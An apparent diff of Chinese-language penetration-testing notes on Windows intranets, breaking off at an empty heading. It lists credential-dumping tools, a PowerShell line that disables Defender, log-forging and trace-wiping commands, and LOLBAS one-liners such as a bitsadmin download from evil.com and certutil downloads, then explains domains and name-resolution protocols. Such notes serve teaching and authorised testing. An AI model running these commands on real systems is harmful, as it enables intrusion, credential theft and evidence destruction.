+&lt;h3 id=&#34;凭证窃取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#凭证窃取&#34;&gt;#&lt;/a&gt; 凭证窃取&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Windows 本地密码散列导出工具
+&lt;ul&gt;
+&lt;li&gt;mimikatz&lt;/li&gt;
+&lt;li&gt;lsass&lt;/li&gt;
+&lt;li&gt;wce&lt;/li&gt;
+&lt;li&gt;gsecdump&lt;/li&gt;
+&lt;li&gt;copypwd&lt;/li&gt;
+&lt;li&gt;Pwdump&lt;/li&gt;
+&lt;li&gt;ProcDump：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wcm9jZHVtcA==&#34;&gt;https://docs.microsoft.com/en-us/sysinternals/downloads/procdump&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Windows 本地密码破解工具
+&lt;ul&gt;
+&lt;li&gt;L0phtCrack&lt;/li&gt;
+&lt;li&gt;SAMInside&lt;/li&gt;
+&lt;li&gt;Ophcrack&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;彩虹表破解&lt;/li&gt;
+&lt;li&gt;本机 hash + 明文抓取&lt;/li&gt;
+&lt;li&gt;win8+win2012 明文抓取&lt;/li&gt;
+&lt;li&gt;ntds.dit 的导出 + QuarkPwDump 读取分析&lt;/li&gt;
+&lt;li&gt;vssown.vbs + libesedb + NtdsXtract&lt;/li&gt;
+&lt;li&gt;ntdsdump&lt;/li&gt;
+&lt;li&gt;利用 powershell (DSInternals) 分析 hash&lt;/li&gt;
+&lt;li&gt;使用  &lt;code&gt;net use \\%computername% /u:%username%&lt;/code&gt;  重置密码尝试次数&lt;/li&gt;
+&lt;li&gt;限制读取时，可 crash 操作系统后，在蓝屏的 dump 文件中读取&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;其他-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他-2&#34;&gt;#&lt;/a&gt; 其他&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;组策略首选项漏洞&lt;/li&gt;
+&lt;li&gt;DLL 劫持&lt;/li&gt;
+&lt;li&gt;替换系统工具，实现后门&lt;/li&gt;
+&lt;li&gt;关闭 defender
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Set-MpPreference -disablerealtimeMonitoring $true&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;痕迹清理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#痕迹清理&#34;&gt;#&lt;/a&gt; 痕迹清理&lt;/h1&gt;
+&lt;h2 id=&#34;日志&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志&#34;&gt;#&lt;/a&gt; 日志&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;查看日志  &lt;code&gt;eventvwr&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;伪造日志  &lt;code&gt;eventcreate&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;操作日志
+&lt;ul&gt;
+&lt;li&gt;3389 登录列表&lt;/li&gt;
+&lt;li&gt;文件打开日志&lt;/li&gt;
+&lt;li&gt;文件修改日志&lt;/li&gt;
+&lt;li&gt;浏览器日志&lt;/li&gt;
+&lt;li&gt;系统事件&lt;/li&gt;
+&lt;li&gt;程序安装记录&lt;/li&gt;
+&lt;li&gt;程序删除记录&lt;/li&gt;
+&lt;li&gt;程序更新记录&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;登录日志
+&lt;ul&gt;
+&lt;li&gt;系统安全日志&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;日志路径
+&lt;ul&gt;
+&lt;li&gt;系统日志：  &lt;code&gt;%SystemRoot%\System32\Winevt\Logs\System.evtx&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;安全日志：  &lt;code&gt;%SystemRoot%\System32\Winevt\Logs\Security.evtx&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;应用程序日志：  &lt;code&gt;%SystemRoot%\System32\Winevt\Logs\Application.evtx&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;服务日志
+&lt;ul&gt;
+&lt;li&gt;IIS：  &lt;code&gt;%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;注册表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册表&#34;&gt;#&lt;/a&gt; 注册表&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;AppCompatFlags&lt;/li&gt;
+&lt;li&gt;Background Activity Moderator (BAM)&lt;/li&gt;
+&lt;li&gt;MuiCache&lt;/li&gt;
+&lt;li&gt;RecentApps&lt;/li&gt;
+&lt;li&gt;RunMRU&lt;/li&gt;
+&lt;li&gt;ShimCache (AppCompatCache)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;注册表键&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册表键&#34;&gt;#&lt;/a&gt; 注册表键&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件&#34;&gt;#&lt;/a&gt; 文件&lt;/h2&gt;
+&lt;h3 id=&#34;prefetch&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#prefetch&#34;&gt;#&lt;/a&gt; Prefetch&lt;/h3&gt;
+&lt;p&gt;预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为 PF。位置在  &lt;code&gt;C:\Windows\Prefetch&lt;/code&gt;  。&lt;/p&gt;
+&lt;h3 id=&#34;jumplists&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jumplists&#34;&gt;#&lt;/a&gt; JumpLists&lt;/h3&gt;
+&lt;p&gt;记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件，位置在  &lt;code&gt;%APPDATA%\Microsoft\Windows\Recent&lt;/code&gt;  。&lt;/p&gt;
+&lt;h3 id=&#34;amcache-recentfilecachebcf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#amcache-recentfilecachebcf&#34;&gt;#&lt;/a&gt; Amcache / RecentFileCache.bcf&lt;/h3&gt;
+&lt;p&gt;Windows 中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间。&lt;/p&gt;
+&lt;p&gt;在 Windows 7、Windows Server 2008 R2 等系统中，文件保存在  &lt;code&gt;C:\Windows\AppCompat\Programs\RecentFileCache.bcf&lt;/code&gt;  ，包含程序的创建时间、上次修改时间、上次访问时间和文件名。&lt;/p&gt;
+&lt;p&gt;在 Windows 8、Windows 10、Windows Server 2012 等系统中，文件保存在  &lt;code&gt;C:\Windows\AppCompat\Programs\Amcache.hve&lt;/code&gt;  ，包含文件大小、版本、sha1、二进制文件类型等信息。&lt;/p&gt;
+&lt;h2 id=&#34;时间轴&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#时间轴&#34;&gt;#&lt;/a&gt; 时间轴&lt;/h2&gt;
+&lt;p&gt;Windows 时间轴是 Windows 10 在 1803 版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等，&lt;/p&gt;
+&lt;h2 id=&#34;彻底删除&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#彻底删除&#34;&gt;#&lt;/a&gt; 彻底删除&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;多次覆写文件  &lt;code&gt;cipher /w:&amp;lt;path&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;格式化某磁盘 count 次  &lt;code&gt;format D: /P:&amp;lt;count&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;横向移动&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#横向移动&#34;&gt;#&lt;/a&gt; 横向移动&lt;/h1&gt;
+&lt;h2 id=&#34;常见入口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见入口&#34;&gt;#&lt;/a&gt; 常见入口&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;SMB 弱密码&lt;/li&gt;
+&lt;li&gt;SqlServer 弱密码&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;lolbas&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lolbas&#34;&gt;#&lt;/a&gt; LOLBAS&lt;/h2&gt;
+&lt;h3 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
+&lt;p&gt;LOLBAS，全称 Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在 2013 年 DerbyCon 由 Christopher Campbell 和 Matt Graeber 发现，最终 Philip Goh 提出的概念。&lt;/p&gt;
+&lt;p&gt;这些程序一般有有 Microsoft 或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过 UAC、绕过程序控制等。&lt;/p&gt;
+&lt;h3 id=&#34;常见程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见程序&#34;&gt;#&lt;/a&gt; 常见程序&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;appsyncvpublishing.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;执行 powershell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;bitsadmin.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;下载文件  &lt;code&gt;bitsadmin /transfer &amp;lt;job_name&amp;gt; /priority &amp;lt;priority&amp;gt; &amp;lt;remote_path&amp;gt; &amp;lt;local_path&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;下载文件  &lt;code&gt;bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;复制文件  &lt;code&gt;bitsadmin /create 1 &amp;amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe &amp;amp; bitsadmin /RESUME 1 &amp;amp; bitsadmin /Complete 1 &amp;amp; bitsadmin /reset&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;代码执行  &lt;code&gt;bitsadmin /create 1 &amp;amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe &amp;amp; bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL &amp;amp; bitsadmin /RESUME 1 &amp;amp; bitsadmin /Reset&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;cdb.exe&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;certutil.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;可安装、备份、删除、管理和执行&lt;/li&gt;
+&lt;li&gt;证书证书存储相关功能&lt;/li&gt;
+&lt;li&gt;下载文件  &lt;code&gt;certutil -urlcache -split -f https://addr/example.exe&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;注意 certutil 是有 cache 的，需要显式删除&lt;/li&gt;
+&lt;li&gt;base64 编解码  &lt;code&gt;certutil -encode&lt;/code&gt;  /  &lt;code&gt;certutil -decode&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;cmd.exe&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;cmstp.exe&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;control.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZGVhcmJ5dGVzLmNvbS9ibG9nL3BsYXlpbmctYXJvdW5kLXdpdGgtbnNhLWhhY2tpbmctdG9vbHMv&#34;&gt;加载 dll&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;csc.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;编译 C# 载荷&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;cscript.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;执行脚本&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;extexport.exe&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;expand.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;展开一个或多个压缩文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;forfiles.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;mofcomp.exe&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;makecab.exe&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;msbuild.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;构建应用程序&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;mshta.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;HTML 应用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;msiexec.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;安装 msi&lt;/li&gt;
+&lt;li&gt;加载 dll&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;msxsl.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;处理 XSL 程序&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;netsh.exe&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;installutil.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;安装 / 卸载程序组件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;IEExec.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;.NET Framework 附带程序&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;powershell.exe&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;psexec.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wc2V4ZWM=&#34;&gt;https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;reg.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;注册表控制台&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;regedit.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;注册表修改&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;regsvr32.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;注册动态链接库 / ActiveX 控件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;rundll32.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;执行 DLL 文件中的内部函数&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;sc.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;查看服务状态管理&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;schtasks.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;定时计划任务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;shred&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;重复写入文件，防止文件恢复&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;type.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;利用 ads 隐藏文件  &lt;code&gt;type &amp;lt;filepath&amp;gt; &amp;lt;target_file:ads&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;wmic.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Windows 管理工具&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;windbg.exe&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;winrm.exe&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;wscript.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;脚本引擎&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;waitfor.exe&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用于同步网络中计算机，可以发送或等待系统上的信号。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;msprc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msprc&#34;&gt;#&lt;/a&gt; MSPRC&lt;/h1&gt;
+&lt;p&gt;MSRPC (Microsoft Remote Procedure Call) 是微软对 DCE/RPC 协议的修改实现，用于支持 Windows 系统中应用程序的远程网络调用。&lt;/p&gt;
+&lt;p&gt;MSRPC 所使用的端口有 UDP 135 和 TCP 139 / 445 。&lt;/p&gt;
+&lt;p&gt;MSRPC 可以用于&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用户遍历&lt;/li&gt;
+&lt;li&gt;服务遍历&lt;/li&gt;
+&lt;li&gt;凭证导出&lt;/li&gt;
+&lt;li&gt;横向移动&lt;/li&gt;
+&lt;li&gt;权限提升&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;域渗透&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域渗透&#34;&gt;#&lt;/a&gt; 域渗透&lt;/h1&gt;
+&lt;h2 id=&#34;用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户&#34;&gt;#&lt;/a&gt; 用户&lt;/h2&gt;
+&lt;h3 id=&#34;用户组与工作组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户组与工作组&#34;&gt;#&lt;/a&gt; 用户组与工作组&lt;/h3&gt;
+&lt;h4 id=&#34;用户-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户-2&#34;&gt;#&lt;/a&gt; 用户&lt;/h4&gt;
+&lt;p&gt;Windows 系统存在一些为了特定用途而设置的用户，分别是：SYSTEM (系统)、Trustedinstaller (信任程序模块)、Everyone (所有人)、Creator Owner (创建者) 等，这些特殊用户不属于任何用户组，是完全独立的账户。其中 SYSTEM 拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限。&lt;/p&gt;
+&lt;h4 id=&#34;用户组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户组&#34;&gt;#&lt;/a&gt; 用户组&lt;/h4&gt;
+&lt;p&gt;Windows 系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限。&lt;/p&gt;
+&lt;p&gt;默认情况下，系统为用户分了 7 个组，并给每个组赋予不同的操作权限。这些组为：管理员组 (Administrators)、高权限用户组 (Power Users)、普通用户组 (Users)、备份操作组 (Backup Operators)、文件复制组 (Replicator)、来宾用户组 (Guests)、身份验证用户组 (Authenticated Users)。&lt;/p&gt;
+&lt;h4 id=&#34;工作组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工作组&#34;&gt;#&lt;/a&gt; 工作组&lt;/h4&gt;
+&lt;p&gt;工作组（Workgroup）是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为 workgroup 的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况。&lt;/p&gt;
+&lt;h3 id=&#34;域中用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域中用户&#34;&gt;#&lt;/a&gt; 域中用户&lt;/h3&gt;
+&lt;h4 id=&#34;域用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域用户&#34;&gt;#&lt;/a&gt; 域用户&lt;/h4&gt;
+&lt;p&gt;域环境中的用户和本地用户的帐户不同，域用户帐户保存在活动目录中。在域环境中，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用 SID (Security Identifier) 来表明身份，用 NTLM 哈希或者 Kerberos 来验证身份。&lt;/p&gt;
+&lt;h4 id=&#34;机器用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#机器用户&#34;&gt;#&lt;/a&gt; 机器用户&lt;/h4&gt;
+&lt;p&gt;机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以  &lt;code&gt;$&lt;/code&gt;  结尾。&lt;/p&gt;
+&lt;h3 id=&#34;组策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#组策略&#34;&gt;#&lt;/a&gt; 组策略&lt;/h3&gt;
+&lt;p&gt;组策略 (Group Policy) 用于控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略 (LGPO 或 LocalGPO)，可以在独立且非域的计算机上管理组策略对象。在域环境中的组策略通常被称作 GPO (Group Policy Object)。&lt;/p&gt;
+&lt;h2 id=&#34;内网常用协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网常用协议&#34;&gt;#&lt;/a&gt; 内网常用协议&lt;/h2&gt;
+&lt;p&gt;Windows 查询名称解析的顺序为 DNS、mDNS、LLMNR、NBNS。&lt;/p&gt;
+&lt;h3 id=&#34;netbios&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#netbios&#34;&gt;#&lt;/a&gt; NetBIOS&lt;/h3&gt;
+&lt;p&gt;NetBIOS（Network Basic Input/Output System）是基于网络的交互协议，通常使用 UDP 137、UDP 138、TCP 139 等端口。Windows 在安装 TCP/IP 协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问。&lt;/p&gt;
+&lt;p&gt;基于 NetBIOS 有 NBNS (NetBIOS Name Service) 服务，通常监听在 UDP 137 端口，该服务提供三种功能：将 NetBIOS 名称解析到 IP、查询某一个 NetBIOS 节点的状态，注册 / 释放一个 NetBIOS 名。&lt;/p&gt;
+&lt;p&gt;可以使用  &lt;code&gt;nbtstat&lt;/code&gt;  工具利用 NetBIOS 协议管理网络。&lt;/p&gt;
+&lt;h3 id=&#34;llmnr&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#llmnr&#34;&gt;#&lt;/a&gt; LLMNR&lt;/h3&gt;
+&lt;p&gt;链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR) 是一个基于 DNS 数据包格式的协议，IPv4 和 IPv6 的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在 Windows Vista 后被引入。 LLMNR 监听 UDP 5355 端口，可以通过多播地址 224.0.0.252 (或  &lt;code&gt;FF02:0:0:0:0:0:1:3&lt;/code&gt; ) 访问。&lt;/p&gt;
+&lt;h3 id=&#34;mdns&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mdns&#34;&gt;#&lt;/a&gt; mDNS&lt;/h3&gt;
+&lt;p&gt;mDNS (multicast DNS) 在 Windows 10 中被引入，监听 UDP 5353 端口，对应的多播地址为 224.0.0.251 (  &lt;code&gt;FF02::FB&lt;/code&gt;  ) 。mDNS 主要实现了在没有传统 DNS 服务器的情况下使局域网内的主机实现相互发现和通信。&lt;/p&gt;
+&lt;h3 id=&#34;wpad&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wpad&#34;&gt;#&lt;/a&gt; WPAD&lt;/h3&gt;
+&lt;p&gt;网络代理自动发现协议 (Web Proxy Auto-Discovery, WPAD) 是一种客户端使用 DHCP 和 / 或 DNS 发现方法来定位一个配置文件 URL 的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定 URL 应使用的代理。&lt;/p&gt;
+&lt;h2 id=&#34;域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域&#34;&gt;#&lt;/a&gt; 域&lt;/h2&gt;
+&lt;h3 id=&#34;域结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域结构&#34;&gt;#&lt;/a&gt; 域结构&lt;/h3&gt;
+&lt;h4 id=&#34;域树&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域树&#34;&gt;#&lt;/a&gt; 域树&lt;/h4&gt;
+&lt;p&gt;域树（Trees）由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间（namespace）。&lt;/p&gt;
+&lt;h4 id=&#34;林&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#林&#34;&gt;#&lt;/a&gt; 林&lt;/h4&gt;
+&lt;p&gt;林（Forests）是一个复杂的 AD 实例，由一个或数个域组成，每个域树都有自己唯一的名称空间。&lt;/p&gt;
+&lt;h3 id=&#34;域控制器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域控制器&#34;&gt;#&lt;/a&gt; 域控制器&lt;/h3&gt;
+&lt;p&gt;ADDS 的目录存储在域控制器 (Domain Controller) 内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同的数据库。&lt;/p&gt;
+&lt;p&gt;在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中。&lt;/p&gt;
+&lt;p&gt;AD 数据库有多主机复制模式（Multi-master Replication Model）和单主机复制模式（Sing-master Replication Model）。&lt;/p&gt;
+&lt;p&gt;多主机模式可以直接更新任何一台域控制器内的 AD 对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制。&lt;/p&gt;
+&lt;p&gt;单主机复制模式是指由一台被称作操作主机（Operations Master）的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器。&lt;/p&gt;
+&lt;h3 id=&#34;信任&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信任&#34;&gt;#&lt;/a&gt; 信任&lt;/h3&gt;
+&lt;p&gt;两个域之间需要创建信任关系，才可以访问对应域内的资源。&lt;/p&gt;
+&lt;h4 id=&#34;域信任类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域信任类型&#34;&gt;#&lt;/a&gt; 域信任类型&lt;/h4&gt;
+&lt;p&gt;Active Directory 的信任方式可以分为以下几种：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Tree-Root Trust
+&lt;ul&gt;
+&lt;li&gt;双向具有转移性&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Parent-Child Trust
+&lt;ul&gt;
+&lt;li&gt;具有转移性，双向行人&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Forest Trust
+&lt;ul&gt;
+&lt;li&gt;如果两个林创建了信任关系，则林中所有的域都相互信任&lt;/li&gt;
+&lt;li&gt;两个林之间的信任关系无法自动扩展到其他林上&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Realm Trust
+&lt;ul&gt;
+&lt;li&gt;ADDS 域可以和非 Windows 系统的 Kerberos 域之间创建信任&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;External Trust
+&lt;ul&gt;
+&lt;li&gt;位于两个林内的域之间可以通过外部信任来创建信任关系&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Shortcut Trust
+&lt;ul&gt;
+&lt;li&gt;可以缩短验证用户身份的时间&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;ou&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ou&#34;&gt;#&lt;/a&gt; OU&lt;/h3&gt;
